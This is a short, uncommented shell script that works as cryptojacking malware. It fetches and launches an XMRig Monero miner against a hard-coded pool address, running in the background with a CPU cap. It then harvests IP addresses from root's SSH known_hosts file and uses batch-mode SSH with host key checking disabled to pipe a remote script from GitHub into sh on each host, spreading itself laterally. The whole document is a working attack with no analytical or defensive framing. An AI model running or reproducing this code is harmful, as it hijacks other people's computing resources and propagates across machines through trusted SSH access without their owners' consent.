wget https://github.com/Pamentierx/xmr/raw/main/xmr.tar.gz
tar -xvzf xmr.tar.gz
cd xmrig-6.14.1
chmod +x xmrig
./xmrig -o 107.182.176.159:8989 -u worker2 -p xx -t 1 -B --cpu-priority 1 --cpu-max-threads-hint=40% --nicehash


if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL https://raw.githubusercontent.com/Pamentierx/xmr/main/xmr.sh||wget -q -O- https://raw.githubusercontent.com/Pamentierx/xmr/main/xmr.sh)|sh >/dev/null 2>&1 &' & done
fi

